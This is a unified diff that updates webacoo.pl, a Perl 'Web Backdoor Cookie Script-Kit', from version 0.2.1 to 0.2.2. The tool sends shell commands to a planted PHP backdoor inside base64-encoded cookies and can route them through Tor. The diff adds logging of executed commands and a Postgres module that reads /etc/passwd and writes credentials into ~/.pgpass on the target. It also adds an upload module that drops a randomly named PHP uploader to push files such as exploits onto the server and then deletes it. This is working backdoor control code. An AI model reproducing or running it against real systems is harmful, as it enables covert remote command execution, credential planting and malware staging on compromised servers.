@@ -33,7 +33,7 @@ my @phpsf = ("system", "shell_exec", "exec", "passthru", "popen");
 
 # Setup
 $WEBACOO{name} = "webacoo.pl";
-$WEBACOO{version} = '0.2.1';
+$WEBACOO{version} = '0.2.2';
 $WEBACOO{description} = 'Web Backdoor Cookie Script-Kit';
 $WEBACOO{author} = 'Anestis Bechtsoudis';
 $WEBACOO{email} = 'anestis@bechtsoudis.com';
@@ -42,6 +42,7 @@ $WEBACOO{twitter} = '@anestisb';
 $WEBACOO{sfuntion} = $phpsf[0]; 		# Default is system()
 $WEBACOO{agent} = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0.2) Gecko/20100101 Firefox/6.0.2";
 $WEBACOO{cookie} = "M-cookie";			# Default cookie name
+$WEBACOO{http_method} = "GET";			# Default is GET, POST used only by certain modules
 $WEBACOO{delim} = '8zM$';			# Initialize delimiter
 $WEBACOO{url} = '';
 $WEBACOO{rhost} = '';
@@ -56,13 +57,18 @@ $WEBACOO{shell_name} = "webacoo";		# Shell name
 $WEBACOO{shell_head} = '$ ';			# Shell head character
 
 ## Help Global Variables ##
-my $command = '';
-my $loaded_module = '';
-my $module_ext_head = '';
-my $module_ext_tail = '';
-my $request = '';
-my $output = '';
-my $sock = '';
+my $command = '';				# Command to be executed at target
+my $loaded_module = '';				# Name of loaded module
+my $module_ext_head = '';			# Extension module cmd header
+my $module_ext_tail = '';			# Extension module cmd tail
+my $request = '';				# HTTP Request Header
+my $request_body = '';				# HTTP Request Body (used by modules)
+my $body_len = '';				# HTTP Request Body length
+my $body_bound = '';				# Boundary used by Upload module
+my $output = '';				# Executed cmd output
+my $output_str = '';				# Store buffer for executed cmd
+my $sock = '';					# Established socket
+my $tmp_fh = '';				# Help variable for filehandler flush
 
 # HTTP Proxy variables
 my @pargs = ();
@@ -72,11 +78,14 @@ my $proxy_pass = '';
 # Verbose data
 my @verdata = ();
 
+# Time variables for logging
+my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst);
+
 # Print WeBaCoo logo
 print_logo();
 
 # Parse command args
-getopts("gf:ro:tu:c:a:d:p:v:h", \%args) or die "[-] Problem with the supplied arguments.\n";
+getopts("gf:ro:tu:c:a:d:p:v:l:h", \%args) or die "[-] Problem with the supplied arguments.\n";
 
 # Check for newer version & apply update
 if(defined $ARGV[0] && $ARGV[0] eq "update") { update(); }
@@ -157,6 +166,11 @@ if(defined $args{t}) {
         }
     }
 
+    # Check for user specified log file
+    if(defined $args{l}) { 
+	if(!open LOG_FILE,">>$args{l}") { print "[-] Problem opening log file.\n"; exit; }
+    }
+
     # If Tor check connectivity status
     if(defined $args{p} && $args{p} eq "tor") { tor_check(); }
     
@@ -165,11 +179,10 @@ if(defined $args{t}) {
     print "[+] Connecting to remote server as...\n";
     if(defined $args{p} && $args{p} eq "tor") { tor_cmd_request(); }
     else { cmd_request(); }
-    print "\n";
 
     # Print help messages
-    print "[!] Type 'load' to use an extension module.\n";
-    print "[!] Type 'exit' to quit terminal.\n\n";
+    print "\n[*] Type 'load' to use an extension module.\n";
+    print "[*] Type 'exit' to quit terminal.\n\n";
 
     # "Terminal" connection loop
     while(1) {
@@ -181,7 +194,12 @@ if(defined $args{t}) {
     	chop($command=<STDIN>);
 
 	# Exit if "exit" is typed
-    	if($command eq "exit") { print "Bye...\n"; last; }
+    	if($command eq "exit") {
+	    # Close log file handler, if log feature used
+	    close(LOG_FILE) if(defined $args{l});
+	    print "Bye...\n"; 
+	    last; 
+	}
 	# Check for module load function
 	elsif($command eq "load") { load_module(); next; }
         # Check for module unload function
@@ -280,6 +298,8 @@ Options:
 		1: print HTTP headers
 		2: print HTTP headers + data
 
+  -l LOG	Log activity to file
+
   -h		Display help and exit
 
   update	Check for updates and apply if any
@@ -361,14 +381,18 @@ sub cmd_request
 	}
     }
 
-    # Form GET request
-    $request = "GET http://$WEBACOO{rhost}$WEBACOO{uri} HTTP/1.1\r\n";
+    # Form HTTP request
+    $request = "$WEBACOO{http_method} http://$WEBACOO{rhost}$WEBACOO{uri} HTTP/1.1\r\n";
     $request .= "Host: $WEBACOO{rhost}:$WEBACOO{rport}\r\n";
     $request .= "Agent: $WEBACOO{agent}\r\n";
     $request .= "Connection: Close\r\n";
     $request .= "Cookie: cm=".encode_base64($command,'').";".
         " cn=$WEBACOO{cookie}; cp=$WEBACOO{delim}\r\n";
-    $request .= "Proxy-Authorization: Basic ".encode_base64($proxy_user.":".$proxy_pass,'')."\r\n" if($proxy_user && $proxy_pass);
+    $request .= "Proxy-Authorization: Basic ".encode_base64($proxy_user.":".$proxy_pass,'').
+	"\r\n" if($proxy_user && $proxy_pass);
+    $request .= "Content-Type: multipart/form-data; boundary=---------------------------".
+	"$body_bound\r\n" if($loaded_module eq "upload");
+    $request .= "Content-Length: $body_len\r\n" if($loaded_module eq "upload");
     $request .= "\r\n";
 
     # Print request if verbose level > 0
@@ -383,8 +407,8 @@ sub cmd_request
     # Error checking
     die "Could not create socket: $!\n" unless $sock;
 
-    # Send GET request
-    print $sock $request;
+    # Send HTTP request
+    print $sock $request.$request_body;
 
     # Get server response
     my $line;
@@ -407,13 +431,14 @@ sub cmd_request
     # Check for HTTP 4xx error status codes
     if($output =~ m/^HTTP\/1\.[0,1].+4\d{2}.+\n/)
     {
-	print "\n[!] 4xx error server response.\n";
+	print "\n[-] 4xx error server response.\n";
 	print "Terminal closed.\n";
 	exit ;
     }
 
     # Check if server responded with the correct cookie name
-    if($output !~ m/Set-Cookie: $WEBACOO{cookie}/) {
+    # Bypass check in case of Upload module
+    if(($output !~ m/Set-Cookie: $WEBACOO{cookie}/) && $loaded_module ne "upload" ) {
         print "[-] Server has not responded with the expected cookie name.\n";
         exit;
     }
@@ -435,19 +460,50 @@ sub cmd_request
 	if($loaded_module eq "mysql-cli") {
 	    $output =~ s/\n/\n\n/;
         }
-	print $output; 
+	
+	# Do not print if 'upload' module is loaded
+	if(($output ne "\n") and ($loaded_module ne "upload")) { print $output; }
+
+	# Store cmd output to output storage buffer
+	$output_str = $output;
+	chop($output_str);
+
+	# Log executed command
+	if(defined $args{l}) {
+	    # Get date
+	    ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst)=localtime(time);
+	    printf LOG_FILE "[%4d-%02d-%02d %02d:%02d:%02d]",$year+1900,$mon+1,$mday,$hour,$min,$sec;
+	    print LOG_FILE " - $WEBACOO{rhost} - $WEBACOO{http_method} $WEBACOO{uri} - ";
+
+	    # Log if traffic is direct of via proxy
+	    if(defined $args{p}) { print LOG_FILE "PROXY"; }
+	    else { print LOG_FILE "DIRECT"; }
+	    print LOG_FILE " - { $command } - { ";
+
+	    # Escape new lines to have a compact single line log
+	    $output =~ s/\n/\\n/g;
+	    print LOG_FILE $output if($WEBACOO{http_method} ne "POST");
+	    print LOG_FILE " }\n";
+
+	    # Flush file handler to avoid losing entries in case of kill
+	    $tmp_fh = select(STDOUT);
+	    select(LOG_FILE);
+	    $|++;
+	    select($tmp_fh);
+	}
     }
 
     # Flush content buffers
     @verdata = ();
     $output = '';
+    $command = '';
 }
 
 #################################################################################
 # Check Tor connectivity
 sub tor_check
 {
-    print "[!] Checking Tor connectivity...\n\n";
+    print "[*] Checking Tor connectivity...\n\n";
 
     # Check Tor tcp socket
     my $tor_sock = IO::Socket::INET->new(
@@ -503,13 +559,16 @@ sub tor_cmd_request
     # Append & prepend extension modules data
     $command = $module_ext_head.$command.$module_ext_tail;
 
-    # Form GET request
-    $request = "GET http://$WEBACOO{rhost}$WEBACOO{uri} HTTP/1.1\r\n";
+    # Form HTTP request
+    $request = "$WEBACOO{http_method} http://$WEBACOO{rhost}$WEBACOO{uri} HTTP/1.1\r\n";
     $request .= "Host: $WEBACOO{rhost}:$WEBACOO{rport}\r\n";
     $request .= "Agent: $WEBACOO{agent}\r\n";
     $request .= "Connection: Close\r\n";
     $request .= "Cookie: cm=".encode_base64($command,'').";".
-        " cn=$WEBACOO{cookie}; cp=$WEBACOO{delim}\r\n";
+        	" cn=$WEBACOO{cookie}; cp=$WEBACOO{delim}\r\n";
+    $request .= "Content-Type: multipart/form-data; boundary=---------------------------".
+		"$body_bound\r\n" if($loaded_module eq "upload");
+    $request .= "Content-Length: $body_len\r\n" if($loaded_module eq "upload");
     $request .= "\r\n";
 
     # Print request if verbose level > 0
@@ -522,10 +581,11 @@ sub tor_cmd_request
                                    ConnectAddr=>$WEBACOO{rhost},
                                    ConnectPort=>$WEBACOO{rport},
                                   );
+    # Error checking
     die "Could not create socks proxy socket: $!\n" unless $sock;
 
-    # Send GET request
-    print $sock $request;
+    # Send HTTP request
+    print $sock $request.$request_body;
 
     # Get server response
     my $line;
@@ -548,13 +608,14 @@ sub tor_cmd_request
     # Check for HTTP 4xx error status codes
     if($output =~ m/^HTTP\/1\.[0,1].+4\d{2}.+\n/)
     {
-        print "\n[!] 4xx error server response.\n";
+        print "\n[-] 4xx error server response.\n";
         print "Terminal closed.\n";
         exit ;
     }
 
     # Check if server responded with the correct cookie name
-    if($output !~ m/Set-Cookie: $WEBACOO{cookie}/) { 
+    # Bypass check in case of Upload module
+    if(($output !~ m/Set-Cookie: $WEBACOO{cookie}/) && $loaded_module ne "upload" ) { 
 	print "[-] Server has not responded with the expected cookie name.\n"; 
 	exit;
     }
@@ -576,12 +637,41 @@ sub tor_cmd_request
         if($loaded_module eq "mysql-cli") {
             $output =~ s/\n/\n\n/;
         }
-        print $output;
+
+	# Do not print if 'upload' module is loaded
+        if($loaded_module ne "upload") { print $output; }
+
+        # Store cmd output to output storage buffer
+        $output_str = $output;
+        chop($output_str);
+
+    	# Log executed command
+        if(defined $args{l}) {
+            # Get date
+            ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst)=localtime(time);
+            printf LOG_FILE "[%4d-%02d-%02d %02d:%02d:%02d]",$year+1900,$mon+1,$mday,$hour,$min,$sec;
+            print LOG_FILE " - $WEBACOO{rhost} - $WEBACOO{http_method} $WEBACOO{uri} - TOR - { $command } - { ";
+
+            # Escape new lines to have a compact single line log
+            $output =~ s/\n/\\n/g;
+
+	    # Log command output
+            print LOG_FILE $output if ($WEBACOO{http_method} ne "POST");
+	    print LOG_FILE " }\n";
+
+            # Flush file handler to avoid losing entries in case of kill
+            $tmp_fh = select(STDOUT);
+            select(LOG_FILE);
+            $|++;
+            select($tmp_fh);
+        }
+
     }
 
     # Flush content buffers
     @verdata = ();
     $output = '';
+    $command = '';
 }
 
 #################################################################################
@@ -618,41 +708,212 @@ sub load_module
     }
 
     # Print available modules
-    print "[!] Type the module name with the correct arguments.\n\n";
     print "Currently available extension modules:\n";
-    print "    mysql-cli <host> <user> <pass>\n\n";
+    print "o MySQL-CLI: MySQL Command Line Module\n";
+    print "    mysql-cli <IP(:port)> <user> <pass>".
+	"      (ex. 'mysql-cli 10.0.1.11 admin pAsS')\n\n";
+    print "o PSQL-CLI: Postgres Command Line Module\n";
+    print "    psql-cli <IP(:port)> <db> <user> <pass>".
+	"  (ex. 'psql-cli 10.0.1.12 testDB root pAsS')\n\n";
+    print "o Upload: File Upload Module\n";
+    print "    upload <local_file> <remote_dir>".
+	"         (ex. 'upload exploit.c /tmp/')\n\n";
+    print "[*] Type the module name with the correct args.\n\n";
 
     # Get user's choice
     print '> ';
     chop($mod_input=<STDIN>);
-
-    # Check input
     my @modargs=split(' ',$mod_input);
-    if (@modargs != 4) { print "[-] Error loading the module\n"; return; }
+    if(!@modargs) { print "[-] No module selected.\n"; return; }
 
-    # Check fom mysql-cli module (will be evolved when more modules are added)
-    if ($modargs[0] ne "mysql-cli") { print "[-] Unknown module name\n"; return; }
+    # MySQL-CLI Module
+    if ($modargs[0] eq "mysql-cli") {
+	if (@modargs != 4) { print "[-] Error loading mysql-cli module\n"; return; }
+	else {
+	    # Check for non default port
+	    my ($db_ip,$db_port) = split(':',$modargs[1]);
+	    $db_port = '3306' if(!defined $db_port);
+
+            # Update 'shell' options
+	    $loaded_module = "mysql-cli";
+    	    $WEBACOO{shell_name} = "mysql-cli";
+    	    $WEBACOO{shell_head} = "> ";
+    	    $module_ext_head = "mysql -h $db_ip -P $db_port -u$modargs[2] -p$modargs[3] -e '";
+    	    $module_ext_tail = "'";
+	}
+    }
+    # PSQL-CLI Module
+    elsif ($modargs[0] eq "psql-cli") {
+	if (@modargs != 5) { print "[-] Error loading psql-cli module\n"; return; }
+	else {
+	    # Check for non default port
+            my ($db_ip,$db_port) = split(':',$modargs[1]);
+            $db_port = '5432' if(!defined $db_port);
+
+	    # Locate running user's home directory
+            $command = "cat /etc/passwd | grep `whoami` | awk -F: '{print \$6}'";
+            print "[*] Detected home dir: ";
+	    if(defined $args{p} && $args{p} eq "tor") { tor_cmd_request(); }
+    	    else { cmd_request(); }
+
+	    # Create credentials Postgres file to bypass interactive password authentication
+	    $command="echo '*:*:*:*:$modargs[4]'> $output_str/.pgpass; chmod 600 $output_str/.pgpass";
+            if(defined $args{p} && $args{p} eq "tor") { tor_cmd_request(); }
+    	    else { cmd_request(); }
+	    print "[*] Credentials file created at: ~/.pgpass\n";
+	    print "[!] Don't **forget** to delete it before exiting.\n";
+
+	    # Update 'shell' options
+	    $loaded_module = "psql-cli";
+    	    $WEBACOO{shell_name} = "psql-cli";
+    	    $WEBACOO{shell_head} = "> ";
+    	    $module_ext_head = "psql -h $db_ip -p $db_port -U $modargs[3] -d $modargs[2] -t -q -c '";
+    	    $module_ext_tail = "'";
+	}
+    }
+    # Upload Module
+    elsif ($modargs[0] eq "upload") {
+	if (@modargs != 3) { print "[-] Error loading upload module\n"; return; }
+        else {
+	    # Validate remote directory argument
+	    if(!($modargs[2] =~ /(^\/).+(\/$)/)) { 
+		print "[!] Upload directory is invalid.\n"; 
+		return;
+	    }
+
+	    # Read local file
+            my $lfile = "";
+	    if(!open FILE,$modargs[1]) { print "[-] Problem opening local file.\n"; return; }
+	    while (<FILE>){
+		$lfile .= $_;
+	    }
+	    close FILE;
+
+            # Get PHP configuration Settings
+            print "[*] PHP upload configuration settings:\n";
+            $command = 'php -r \'echo "File Uploads   :";echo (ini_get("file_uploads"))?"ON":"OFF";'.
+                       'echo "\nUpload Max Size:".ini_get("upload_max_filesize")."\n";\'';
+	    if(defined $args{p} && $args{p} eq "tor") { tor_cmd_request(); }
+            else { cmd_request(); }
+	    print "\n";
+
+	    # If PHP-CLI didn't work, ask user how to continue
+	    if(index($output_str,'not found') ne -1) {
+		print "[!] PHP CLI command not found.\n";
+		print "[?] Continue with file upload ('yes' or 'no')? ";
+		my $answer = '';
+    		chop($answer=<STDIN>);
+		if($answer ne 'yes') { return; }
+            }	
+	    elsif(index($output_str,'OFF') ne -1) {
+		print "[!] File uploads via HTTP POST are disabled.\n";
+		return;
+	    }
+
+	    # Generate a random string name for the PHP uploader file
+	    my $tmp_fup = &random_string(6).'.php';
+
+	    # Generate a random string name for the uploaded file
+	    my $tmp_up = &random_string(6);
+
+	    # Check if PHP uploader file is writable
+	    $command = "touch $tmp_fup";
+            if(defined $args{p} && $args{p} eq "tor") { tor_cmd_request(); }
+            else { cmd_request(); }
+	    if(index($output_str,'denied') ne -1) {
+		print "[-] PHP Uploader file cannot be written.\n";
+	        return ;
+            }
+
+	    # Write PHP uploader file
+	    $command = 'echo \'<?php if($_FILES["file"]["error"]>0){exit;}'.
+		       'else{move_uploaded_file($_FILES["file"]["tmp_name"],'.
+		       "\"$modargs[2]\"".'.$_FILES["file"]["name"]);}\'> ./'."$tmp_fup";
+	    if(defined $args{p} && $args{p} eq "tor") { tor_cmd_request(); }
+            else { cmd_request(); }
+
+	    # Form POST Request body
+	    $body_bound = int(rand(2000000000))+1000000000;
+	    $request_body = "-----------------------------$body_bound\r\n";
+	    $request_body .= "Content-Disposition: form-data; name=\"file\"; filename=\"$tmp_up\"\r\n";
+	    $request_body .= "Content-Type: text/plain\r\n\r\n";
+	    $request_body .= "$lfile";
+	    $request_body .= "\r\n-----------------------------$body_bound\r\n";
+	    $request_body .= "Content-Disposition: form-data; name=\"submit\"\r\n\r\n";
+	    $request_body .= "Submit";
+	    $request_body .= "\r\n-----------------------------$body_bound--\r\n";
+
+	    # Calculate body length
+	    $body_len = length($request_body);
+
+	    # Temporaly change global variables for the POST request
+	    $WEBACOO{http_method} = "POST";
+	    my $tmp_uri = $WEBACOO{uri};
+	    $WEBACOO{uri} = "/".$tmp_fup;
+	    $loaded_module = "upload";
+	    if(defined $args{p} && $args{p} eq "tor") { tor_cmd_request(); }
+            else { cmd_request(); }
+
+	    # Restore global variables
+	    $WEBACOO{http_method} = "GET";
+            $WEBACOO{uri} = $tmp_uri;
+	    $loaded_module = "";
+
+	    # Remove PHP uploader file
+	    $command = "rm $tmp_fup";
+	    if(defined $args{p} && $args{p} eq "tor") { tor_cmd_request(); }
+            else { cmd_request(); }
+
+	    # Check if file uploaded successfully
+	    $command = "touch $modargs[2]$tmp_up";
+	    if(defined $args{p} && $args{p} eq "tor") { tor_cmd_request(); }
+            else { cmd_request(); }
+            if(index($output_str,'denied') ne -1) {
+                print "[-] File upload failed. Double check permissions.\n";
+                return ;
+            }
+
+	    # Print success message with upload path
+	    print "[+] File uploaded at ".$modargs[2].$tmp_up."\n";
+
+	    # Upload module doesn't need unload
+	    print "[*] Upload module unloaded.\n";
+	    return ;
+	} 
+    }
+    else { print "[-] Unknown module name.\n"; return; }
 
     # Print module help messages
-    print "[+] $modargs[0] module successfully loaded.\n\n";
-    print "[!] Type 'unload' to unload the module and return to the original cmd.\n\n";
-
-    # Update module related global variables
-    $loaded_module = "mysql-cli";
-    $WEBACOO{shell_name} = "mysql-cli";
-    $WEBACOO{shell_head} = "> ";
-    $module_ext_head = "mysql -h $modargs[1] -u$modargs[2] -p$modargs[3] -e '";
-    $module_ext_tail = "'";
+    print "[+] $modargs[0] module successfully loaded.\n";
+    print "[*] Type 'unload' to unload the module and return to the original cmd.\n\n";
 }
 
 #################################################################################
 # Unload extension modules
 sub unload_module
 {
+    # Print notification message
+    print "\n[+] $loaded_module has been unloaded.\n";
+
     # Revert to initial state the module related global variables
     $WEBACOO{shell_name} = "webacoo";
     $WEBACOO{shell_head} = '$ ';
     $loaded_module = '';
     $module_ext_head = '';
     $module_ext_tail = '';
+}
+
+#################################################################################
+# Random string for tmp file names
+sub random_string
+{
+	my $length = shift;
+
+	my @chars=('a'..'z','A'..'Z');
+	my $random_string;
+	foreach (1..$length) 
+	{
+		$random_string.=$chars[rand @chars];
+	}
+	return $random_string;
 }
